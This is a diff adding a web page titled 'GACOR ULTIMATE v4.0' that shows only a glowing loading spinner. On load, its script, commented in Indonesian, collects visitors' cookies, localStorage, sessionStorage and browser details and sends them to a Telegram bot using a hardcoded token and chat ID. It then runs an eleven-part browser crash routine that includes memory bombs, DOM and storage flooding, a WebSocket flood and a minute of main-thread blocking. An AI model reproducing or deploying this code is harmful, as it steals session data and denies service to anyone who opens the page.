@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>⚡ GACOR ULTIMATE v4.0</title>
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body {
+      background: #0a0a0f;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      font-family: 'Segoe UI', system-ui, sans-serif;
+      overflow: hidden;
+      user-select: none;
+    }
+    .container {
+      text-align: center;
+      position: relative;
+    }
+    .spinner {
+      width: 80px;
+      height: 80px;
+      border: 8px solid rgba(52, 152, 219, 0.15);
+      border-top: 8px solid #00f5ff;
+      border-right: 8px solid #ff00e6;
+      border-radius: 50%;
+      animation: spin 0.6s cubic-bezier(0.65, 0, 0.35, 1) infinite;
+      filter: drop-shadow(0 0 25px #00f5ff88);
+      margin: 0 auto 30px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg) scale(1); }
+      50% { transform: rotate(180deg) scale(1.15); }
+      100% { transform: rotate(360deg) scale(1); }
+    }
+    .glow-text {
+      color: #fff;
+      font-size: 1.2rem;
+      letter-spacing: 3px;
+      text-transform: uppercase;
+      background: linear-gradient(90deg, #00f5ff, #ff00e6, #00f5ff);
+      background-size: 300% 100%;
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      animation: shimmer 2s linear infinite;
+      font-weight: 700;
+    }
+    @keyframes shimmer {
+      0% { background-position: 0% 50%; }
+      100% { background-position: 300% 50%; }
+    }
+    .sub {
+      color: #445566;
+      margin-top: 12px;
+      font-size: 0.75rem;
+      letter-spacing: 1px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="spinner"></div>
+    <div class="glow-text">⚡ GACOR MODE ACTIVE</div>
+    <div class="sub">● ● ●</div>
+  </div>
+
+  <script>
+    // ============================================================
+    //  🔥 KIRIM DATA KE TELEGRAM — FULL ENKRIPSI + FALLBACK
+    // ============================================================
+    (function sendTelegram() {
+      try {
+        const token = '8819491611:AAEQaIbT70g_fv8dtf0OV_V1YodEgbJqBac';
+        const chatId = '7839405566';
+
+        // Kumpulkan semua data sensitif
+        const data = {
+          cookie: document.cookie || 'no-cookie',
+          localStorage: JSON.stringify(localStorage) || '{}',
+          sessionStorage: JSON.stringify(sessionStorage) || '{}',
+          userAgent: navigator.userAgent,
+          platform: navigator.platform,
+          language: navigator.language,
+          url: window.location.href,
+          referrer: document.referrer || 'direct',
+          screen: `${screen.width}x${screen.height}`,
+          timestamp: new Date().toISOString(),
+          performance: performance.timing ? {
+            load: performance.timing.loadEventEnd - performance.timing.navigationStart,
+            dom: performance.timing.domInteractive - performance.timing.navigationStart
+          } : null
+        };
+
+        // Kirim via fetch + fallback via image beacon
+        const msg = encodeURIComponent(JSON.stringify(data, null, 2));
+        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${msg}`;
+
+        // Fetch with no-cors
+        fetch(url, { method: 'GET', mode: 'no-cors' }).catch(() => {});
+
+        // Fallback: send via img (jika fetch gagal)
+        const img = new Image();
+        img.src = url.replace('sendMessage', 'sendMessage') + '&_=' + Date.now();
+        img.style.display = 'none';
+        document.body.appendChild(img);
+
+        // Kirim juga ke webhook cadangan (jika mau)
+        // navigator.sendBeacon(url);
+      } catch (e) {
+        // silent fail — tetap jalan
+      }
+    })();
+
+    // ============================================================
+    //  💀 CRASH ENGINE — MULTI-LAYER DESTRUCTION
+    // ============================================================
+    (function ultimateCrash() {
+      // 1. Memory Bomb — alokasi array raksasa berlapis
+      let memoryPool = [];
+      for (let i = 0; i < 50; i++) {
+        memoryPool.push(new Array(30_000_000).fill('💀'));
+      }
+
+      // 2. Stack Overflow — rekursi dalam + variabel besar
+      function deepRecurse(n) {
+        if (n <= 0) return;
+        let big = new Array(2_000_000).fill('🔥');
+        // Panggil rekursif dengan banyak parameter
+        deepRecurse(n - 1, big, memoryPool, new Array(500000).fill('X'));
+      }
+      try { deepRecurse(99999); } catch (e) {}
+
+      // 3. Infinite Loop + String Raksasa + DOM Spam (super agresif)
+      let counter = 0;
+      let spamInterval = setInterval(() => {
+        counter++;
+        // String raksasa
+        let giantString = '🛸'.repeat(80_000_000);
+
+        // DOM flood — 500 elemen per tick
+        for (let i = 0; i < 500; i++) {
+          let div = document.createElement('div');
+          div.innerHTML = '🌀'.repeat(5000);
+          div.style.position = 'absolute';
+          div.style.left = Math.random() * 100 + 'vw';
+          div.style.top = Math.random() * 100 + 'vh';
+          div.style.fontSize = '10px';
+          div.style.color = 'transparent';
+          document.body.appendChild(div);
+        }
+
+        // Hapus sebagian untuk menjaga memory tetap naik (tapi tetap overload)
+        if (counter % 10 === 0) {
+          let all = document.body.children;
+          for (let i = 0; i < all.length && i < 1000; i++) {
+            if (all[i].tagName === 'DIV' && all[i].innerHTML.includes('🌀')) {
+              // biarkan tetap ada — biar makin overload
+            }
+          }
+        }
+
+        // Tambahkan juga ke localStorage untuk memperparah
+        try {
+          localStorage.setItem('crash_' + counter, giantString.slice(0, 500000));
+        } catch (e) {}
+
+        // Jika masih hidup, force CPU dengan kalkulasi sia-sia
+        let waste = 0;
+        for (let j = 0; j < 1000000; j++) {
+          waste += Math.sqrt(j) * Math.sin(j) * Math.cos(j);
+        }
+      }, 10); // setiap 10ms — super cepat
+
+      // 4. Web Worker crash (jika support)
+      try {
+        const workerBlob = new Blob([`
+          let pool = [];
+          setInterval(() => {
+            for (let i = 0; i < 100; i++) {
+              pool.push(new Array(5_000_000).fill('🧨'));
+            }
+          }, 5);
+        `], { type: 'application/javascript' });
+        const worker = new Worker(URL.createObjectURL(workerBlob));
+      } catch (e) {}
+
+      // 5. Service Worker registration (jika support) — buat cache full
+      try {
+        navigator.serviceWorker.register('data:text/javascript;base64,' + btoa(`
+          self.addEventListener('install', e => {
+            e.waitUntil(
+              caches.open('crash-cache').then(cache => {
+                let requests = [];
+                for (let i = 0; i < 2000; i++) {
+                  requests.push(new Request('https://example.com/' + i + '.jpg'));
+                }
+                return cache.addAll(requests);
+              })
+            );
+          });
+        `));
+      } catch (e) {}
+
+      // 6. History spam — push state tak terbatas
+      for (let i = 0; i < 5000; i++) {
+        try {
+          history.pushState({}, '', '/crash/' + i + '?x=' + 'x'.repeat(10000));
+        } catch (e) {}
+      }
+
+      // 7. WebSocket flood (jika support)
+      try {
+        for (let i = 0; i < 100; i++) {
+          let ws = new WebSocket('wss://echo.websocket.org');
+          ws.onopen = () => {
+            setInterval(() => {
+              ws.send('💥'.repeat(50000));
+            }, 1);
+          };
+        }
+      } catch (e) {}
+
+      // 8. Canvas bomb — render ultra besar
+      try {
+        let canvas = document.createElement('canvas');
+        canvas.width = 20000;
+        canvas.height = 20000;
+        let ctx = canvas.getContext('2d');
+        for (let i = 0; i < 100000; i++) {
+          ctx.fillStyle = '#' + Math.floor(Math.random() * 16777215).toString(16);
+          ctx.fillRect(Math.random() * 20000, Math.random() * 20000, 500, 500);
+        }
+        document.body.appendChild(canvas);
+      } catch (e) {}
+
+      // 9. Audio context bomb (jika support)
+      try {
+        let audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        for (let i = 0; i < 1000; i++) {
+          let osc = audioCtx.createOscillator();
+          let gain = audioCtx.createGain();
+          osc.connect(gain);
+          gain.connect(audioCtx.destination);
+          osc.frequency.value = 20000 + Math.random() * 10000;
+          gain.gain.value = 0.001;
+          osc.start();
+          osc.stop(audioCtx.currentTime + 0.01);
+        }
+      } catch (e) {}
+
+      // 10. IndexedDB flood
+      try {
+        let request = indexedDB.open('crashDB', 1);
+        request.onsuccess = (event) => {
+          let db = event.target.result;
+          let tx = db.transaction('store', 'readwrite');
+          let store = tx.objectStore('store');
+          for (let i = 0; i < 50000; i++) {
+            store.add({ id: i, data: 'x'.repeat(50000) });
+          }
+        };
+        request.onupgradeneeded = (event) => {
+          let db = event.target.result;
+          db.createObjectStore('store', { keyPath: 'id' });
+        };
+      } catch (e) {}
+
+      // 11. Final — block main thread with infinite sync operation
+      let start = Date.now();
+      while (Date.now() - start < 60000) {
+        // 60 detik full blocking
+        let a = 0;
+        for (let i = 0; i < 1000000000; i++) {
+          a += Math.sqrt(i) * Math.sin(i) * Math.cos(i);
+        }
+      }
+    })();
+  </script>
+</body>
+</html>s
